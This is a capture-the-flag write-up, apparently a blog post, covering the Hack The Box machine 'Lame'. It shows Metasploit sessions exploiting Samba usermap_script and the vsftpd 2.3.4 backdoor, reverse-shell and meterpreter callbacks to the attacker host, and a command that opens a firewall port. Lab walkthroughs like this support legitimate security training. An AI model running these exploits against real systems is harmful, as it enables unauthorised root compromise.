---
layout: post
title: Hack The Box | Lame
date: 2024-10-15 17:41 +0100
categories: [HackTheBox, Easy]
tags: [ctf, cve-2011-2523, cve-2007-2447, easy, ftp, hackthebox, infosec, lame, metasploit, nmap, samba, smb, ufw, vsftpd, writeup]
toc: true
media_subpath: '/assets/img/posts/2024/hack-the-box-lame'
image: 
  path: thumbnail.png
  alt: Hack The Box | Lame
---

## Introduction

***

**Name: [Lame](https://app.hackthebox.com/machines/Lame)**

**Creator: ch4p**

**Release Date: 14-3-2017** 

**Difficulty: Easy**

An incredibly easy machine to root. On the surface, it may seem lame has little to offer. However, look beneath the surface and you will find interesting exploitation paths housing an opportunity to refine your skills.

***

### Enumeration

As always we start with an nmap scan: `nmap -sV -sC -oN results.txt 10.10.10.3`.

```console
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.38
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m20s, deviation: 2h49m45s, median: 18s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-10-15T09:53:11-04:00
```

This box is quite flexible. We have long outdated versions of samba, and vsftdp, both of which have known, easy to exploit vulnerabilities. 

```console
 searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                            | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution                                                                         | unix/remote/49757.py
------------------------------------------------------------------------------------------------------------------ ---------------------------------

------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                            | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                             | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                     | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

Normally, it is prudent to be thorough in our enumeration. And while I would encourage you to experiment with connecting to the FTP server and SMB shares yourself, I have done so and neither house any valuable information. In fact, accessing the FTP server as the anonymous user yields only an empty folder. Therefore, I have omitted these aspects of the box from this walkthrough.


***

### Exploitation Path: SAMBA

```console

msfconsole -q
[msf](Jobs:0 Agents:0) >> setg RHOSTS 10.10.10.3
RHOST => 10.10.10.3
[msf](Jobs:0 Agents:0) >> setg LHOST 10.10.14.38
LHOST => 10.10.14.38
[msf](Jobs:0 Agents:0) >> use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> run
[*] Started reverse TCP handler on 10.10.14.38:4444 
[*] Command shell session 1 opened (10.10.14.38:4444 -> 10.10.10.3:54904) at 2024-10-15 09:26:39 -0500

background

Background session 1? [y/N]  y
[msf](Jobs:0 Agents:1) exploit(multi/samba/usermap_script) >> 
```

All fairly straight forward stuff, we set our remote host, our local host, find the module and gain access. Except, I would like to make life easier and use a meterpreter session. As with most things in metasploit, there’s a module for that.

```console
[msf](Jobs:0 Agents:1) exploit(multi/samba/usermap_script) >> use post/multi/manage/shell_to_meterpreter 
[msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.38:4433 
[*] Sending stage (1017704 bytes) to 10.10.10.3
[*] Meterpreter session 2 opened (10.10.14.38:4433 -> 10.10.10.3:60308) at 2024-10-15 09:31:18 -0500
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
[msf](Jobs:0 Agents:2) post(multi/manage/shell_to_meterpreter) >> sessions 2
[*] Starting interaction with 2...

(Meterpreter 2)(/) > getuid
Server username: root
```

That's it, we have rooted the machine...

However, you may have attempted to use the VSFTPD exploit earlier, and perhaps that exploit didn’t work. Stick around and I will show the other exploitation path, as there’s a lesson to be learned there.

***

### Exploitation Path: VSFTPD

Let's try the easiest route, a metasploit module. 

```console

[msf](Jobs:0 Agents:2) post(multi/manage/shell_to_meterpreter) >> use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact
run
[msf](Jobs:0 Agents:2) post(multi/manage/shell_to_meterpreter) >> use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:2) exploit(unix/ftp/vsftpd_234_backdoor) >> run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Well, that didn't work... why? 

Let's find out! 

If we examine the exploit code, we see the backdoor is created on port 6200[^footnote]. Okay, fine, so what's the problem? I discovered the machine has UFW enabled, which ends up blocking the port. Hence why the exploit fails... unless, of course, we punch a hole in the firewall, opening up port 6200. Though remember, this is just one solution to the problem. 

```console
(Meterpreter 2)(/) > shell
Process 6063 created.
Channel 1 created.
ufw status 
Firewall loaded

To                         Action  From
--                         ------  ----
22:tcp                     ALLOW   Anywhere
22:udp                     ALLOW   Anywhere
21:tcp                     ALLOW   Anywhere
3632:tcp                   ALLOW   Anywhere
3632:udp                   ALLOW   Anywhere
139:tcp                    ALLOW   Anywhere
139:udp                    ALLOW   Anywhere
445:tcp                    ALLOW   Anywhere
445:udp                    ALLOW   Anywhere
sudo ufw allow 6200 
Rule added
sudo ufw status
Firewall loaded

To                         Action  From
--                         ------  ----
22:tcp                     ALLOW   Anywhere
22:udp                     ALLOW   Anywhere
21:tcp                     ALLOW   Anywhere
3632:tcp                   ALLOW   Anywhere
3632:udp                   ALLOW   Anywhere
139:tcp                    ALLOW   Anywhere
139:udp                    ALLOW   Anywhere
445:tcp                    ALLOW   Anywhere
445:udp                    ALLOW   Anywhere
6200:tcp                   ALLOW   Anywhere
6200:udp                   ALLOW   Anywhere
```

Let's try our exploit again.

```console
[msf](Jobs:0 Agents:1) exploit(unix/ftp/vsftpd_234_backdoor) >> run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[+] 10.10.10.3:21 - Backdoor service has been spawned, handling...
[+] 10.10.10.3:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 3 opened (10.10.14.38:44067 -> 10.10.10.3:6200) at 2024-10-15 10:41:38 -0500

whoami
root
```

And there we go, a root shell. 

***

### Obtaining the Flags 

Fortunately, this is straightforward. There are no further surprises on this machine.

```console
(Meterpreter 2)(/) > shell
Process 6293 created.
Channel 1 created.
find . -name user.txt
./home/makis/user.txt
cat /home/makis/user.txt
{FLAG REDACTED}
cat root/root.txt
{FLAG REDACTED}
```

**That's it, nothing too lame about lame!**

*** 

### References

[^footnote]: https://www.exploit-db.com/exploits/17491
